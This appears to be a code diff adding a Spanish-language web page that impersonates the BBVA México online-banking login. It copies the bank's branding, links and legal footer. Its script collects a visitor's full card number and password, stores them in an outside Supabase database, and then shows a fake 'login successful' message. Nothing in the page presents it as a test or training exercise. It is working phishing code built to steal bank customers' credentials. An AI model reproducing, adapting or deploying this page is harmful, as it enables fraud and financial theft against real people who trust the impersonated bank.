@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Acceso BBVA México</title>
+  <link rel="icon" href="../nav.png" type="image/png"></head>
+
+  <link rel="stylesheet" href="css/styles.css" />
+<body>
+  <div class="page-wrapper">
+
+  <!-- NAVBAR -->
+  <header class="navbar">
+    <div class="head-content">
+      <a href="https://www.bbva.mx/" target="_blank" rel="noopener noreferrer" class="navbar__link">
+        <img src="../image.png" alt="Ir a BBVA México" class="navbar__img-btn" />
+      </a>
+    </div>
+  </header>
+
+  <!-- SEGURIDAD BAR -->
+  <div class="security-bar"></div>
+
+  <!-- MAIN CONTENT -->
+  <main class="main-content">
+    <!-- Paso 1: Número de tarjeta -->
+    <section class="login-card" id="step-card">
+      <img src="../cando.png" alt="Seguridad BBVA" class="security-bar__img" />
+      <h1 class="welcome-title">¡Bienvenido!</h1>
+
+      <div class="input-group">
+        <div class="input-wrapper input-wrapper--small">
+          <input
+            type="text"
+            id="card-number"
+            class="input-field input-field--small"
+            placeholder="Número de Tarjeta"
+            maxlength="16"
+            autocomplete="cc-number"
+          />
+          <button class="toggle-visibility" id="toggle-card" aria-label="Mostrar número">
+            <svg id="eye-icon-card" class="eye-icon" viewBox="0 0 22 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M1 8C1 8 4.5 2 11 2C17.5 2 21 8 21 8C21 8 17.5 14 11 14C4.5 14 1 8 1 8Z" stroke="#072146" stroke-width="1.6"/>
+              <circle cx="11" cy="8" r="3" stroke="#072146" stroke-width="1.6"/>
+              <line x1="2" y1="2" x2="20" y2="14" stroke="#072146" stroke-width="1.6" stroke-linecap="round" id="eye-slash-card"/>
+            </svg>
+          </button>
+        </div>
+      </div>
+
+<p class="error-msg hidden" id="error-card">
+  <span class="error-icon">
+    <svg viewBox="0 0 14 12" xmlns="http://www.w3.org/2000/svg">
+      <path d="M6.99999 9.91202C7.33136 9.91202 7.59999 9.64339 7.59999 9.31202C7.59999 8.98065 7.33136 8.71202 6.99999 8.71202C6.66862 8.71202 6.39999 8.98065 6.39999 9.31202C6.39999 9.64339 6.66862 9.91202 6.99999 9.91202Z"/>
+      <path d="M7.53332 4.51202H6.46666V7.71202H7.53332V4.51202Z"/>
+      <path d="M12.426 11.9787H1.57399C1.29132 11.9787 1.03599 11.8347 0.889325 11.5927C0.743325 11.3514 0.733991 11.0574 0.865325 10.8074L6.29132 0.448686C6.42999 0.184019 6.70132 0.0200195 6.99999 0.0200195C7.29866 0.0200195 7.56999 0.184019 7.70866 0.448686L13.1347 10.8074C13.266 11.0574 13.2567 11.3514 13.1107 11.5927C12.9647 11.834 12.7087 11.9787 12.426 11.9787ZM2.01466 10.912H11.9853L6.99999 1.39469L2.01466 10.912Z"/>
+    </svg>
+  </span>
+  <span>Ingresa un número de tarjeta válido</span>
+</p>
+
+      <div class="btn-row">
+        <button class="btn-primary" id="btn-continuar">Continuar</button>
+        <a href="https://www.bbva.mx/personas/registro.html" 
+   target="_blank" 
+   rel="noopener noreferrer"
+   class="btn-register">
+   Registrarte
+</a>
+      </div>
+    </section>
+
+    <!-- Paso 2: Contraseña -->
+    <section class="login-card hidden" id="step-password">
+      <h1 class="welcome-title">Ingresa tu contraseña</h1>
+      <p class="card-hint" id="card-hint"></p>
+
+      <div class="input-group">
+        <label class="input-label" for="password">Contraseña</label>
+        <div class="input-wrapper">
+          <input
+            type="password"
+            id="password"
+            class="input-field"
+            placeholder=""
+            autocomplete="current-password"
+          />
+          <button class="toggle-visibility" id="toggle-pass" aria-label="Mostrar contraseña">
+            <svg id="eye-icon-pass" class="eye-icon" viewBox="0 0 22 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M1 8C1 8 4.5 2 11 2C17.5 2 21 8 21 8C21 8 17.5 14 11 14C4.5 14 1 8 1 8Z" stroke="#072146" stroke-width="1.6"/>
+              <circle cx="11" cy="8" r="3" stroke="#072146" stroke-width="1.6"/>
+              <line x1="2" y1="2" x2="20" y2="14" stroke="#072146" stroke-width="1.6" stroke-linecap="round" id="eye-slash-pass"/>
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <div class="btn-row">
+        <button class="btn-primary" id="btn-ingresar">Ingresar</button>
+        <a href="#" class="btn-link" id="btn-volver">Volver</a>
+      </div>
+
+      <p class="error-msg hidden" id="error-pass">Contraseña incorrecta. Intenta de nuevo.</p>
+    </section>
+
+    <!-- Panel lateral de seguridad -->
+    <aside class="security-panel">
+      <div class="security-panel__icon">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" width="22" height="22">
+          <circle cx="12" cy="12" r="10" stroke="#c8922a" stroke-width="1.8"/>
+          <path d="M12 7v5" stroke="#c8922a" stroke-width="2" stroke-linecap="round"/>
+          <circle cx="12" cy="16.5" r="1.1" fill="#c8922a"/>
+        </svg>
+      </div>
+      <div>
+        <p class="security-panel__title">Cuida tus datos y la seguridad de tu equipo</p>
+        <p class="security-panel__text">
+          Algunas extensiones de los navegadores pueden poner en riesgo la seguridad de tus datos.
+          Evita instalarlas en el navegador que usas para entrar a bbva.mx.
+        </p>
+        <a href="https://www.bbva.mx/personas/centro-de-ayuda/consejos-de-seguridad/sitios-apocrifos.html" 
+   target="_blank" 
+   rel="noopener noreferrer"
+   class="security-panel__link">
+   Más información
+</a>
+      </div>
+    </aside>
+  </main>
+
+  <!-- MODAL DE ÉXITO (simulado) -->
+  <div class="modal-overlay hidden" id="modal-success">
+    <div class="modal">
+      <svg class="modal-check" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="30" cy="30" r="28" stroke="#072146" stroke-width="2.5"/>
+        <path d="M18 30l9 9 15-16" stroke="#072146" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      <h2 class="modal-title">¡Inicio de sesión exitoso!</h2>
+      <p class="modal-text">Has ingresado correctamente a tu banca en línea.</p>
+      <button class="btn-primary" id="btn-modal-close">Aceptar</button>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    <div class="content-footer">
+      <div class="footer__links">
+        <a href="https://www.bbva.mx/personas/aviso-legal.html" target="_blank" rel="noopener noreferrer">
+  Aviso legal
+</a>
+        <a href="https://www.bbva.mx/personas/mapa-del-sitio.html" target="_blank" rel="noopener noreferrer">
+  Mapa del sitio
+</a>
+        <a href="https://www.bbva.mx/personas/aviso-de-privacidad.html" target="_blank" rel="noopener noreferrer">
+  Aviso de privacidad
+</a>
+      </div>
+      <div class="footer__links footer__links--sub">
+        <a href="https://www.bbva.mx/content/dam/public-web/mexico/documents/tarifario-general/Tarifario.pdf" target="_blank" rel="noopener noreferrer">
+  Consulta los costos y las comisiones de nuestros productos
+</a>
+      </div>
+      <p class="footer__legal">© 2025 BBVA México, S.A., Institución de Banca Múltiple, Grupo Financiero BBVA Bancomer, Avenida Paseo de la Reforma 510, colonia Juárez, código postal 06600, alcaldía Cuauhtémoc, Ciudad de México.</p>
+    </div>
+  </footer>
+
+  <!-- Scripts -->
+  <!-- SDK de Supabase (UMD) -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <!-- Tus credenciales (editar supabase-config.js) -->
+  <script src="js/supabase-config.js"></script>
+  <!-- Lógica de autenticación -->
+  <script src="js/auth.js"></script>
+  </div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+  const input = document.getElementById("card-number");
+
+  let real = "";
+
+  input.addEventListener("keydown", (e) => {
+    // Permitir borrar
+    if (e.key === "Backspace") {
+      real = real.slice(0, -1);
+      updateView();
+      e.preventDefault();
+      return;
+    }
+
+    // Solo números
+    if (!/^\d$/.test(e.key)) {
+      e.preventDefault();
+      return;
+    }
+
+    // Limitar a 16
+    if (real.length >= 16) {
+      e.preventDefault();
+      return;
+    }
+
+    // Agregar número real
+    real += e.key;
+
+    updateView();
+    e.preventDefault();
+  });
+
+  function updateView() {
+    let masked = "";
+
+    for (let i = 0; i < real.length; i++) {
+      if (i < real.length - 4) {
+        masked += "*";
+      } else {
+        masked += real[i];
+      }
+    }
+
+    input.value = masked;
+  }
+  // ==================== NUEVO CÓDIGO PARA GUARDAR EN SUPABASE ====================
+
+// ==================== REDIRECCIÓN A LOGIN.HTML ====================
+const btnContinuar = document.getElementById("btn-continuar");
+
+btnContinuar.addEventListener("click", () => {
+  const cardNumber = real;   // Variable que ya tienes
+
+  if (cardNumber.length !== 16) {
+    document.getElementById("error-card").classList.remove("hidden");
+    return;
+  }
+
+  // Guardar el número de tarjeta para usarlo en login.html
+  sessionStorage.setItem("cardNumber", cardNumber);
+
+  // Redirigir a la página de contraseña
+  window.location.href = "login.html";
+});
+// ==================== GUARDAR TARJETA + CONTRASEÑA EN SUPABASE ====================
+
+const btnIngresar = document.getElementById("btn-ingresar");
+
+btnIngresar.addEventListener("click", async () => {
+  const password = document.getElementById("password").value.trim();
+  const cardNumber = sessionStorage.getItem("cardNumber");
+
+  if (!password) {
+    alert("Por favor ingresa tu contraseña");
+    return;
+  }
+
+  if (!cardNumber) {
+    alert("Error: No se encontró número de tarjeta");
+    return;
+  }
+
+  try {
+    // Hashear contraseña
+    const encoder = new TextEncoder();
+    const data = encoder.encode(password);
+    const hashBuffer = await crypto.subtle.digest("SHA-256", data);
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    const passwordHash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+
+    const { error } = await supabase
+      .from('users')
+      .insert([{ 
+        card_number: cardNumber, 
+        password_hash: passwordHash 
+      }]);
+
+    if (error) throw error;
+
+    // Mostrar modal de éxito
+    document.getElementById("modal-success").classList.remove("hidden");
+
+  } catch (err) {
+    console.error(err);
+    alert("Error al guardar los datos: " + err.message);
+  }
+});
+});
+</script>
+</body>
+</html>
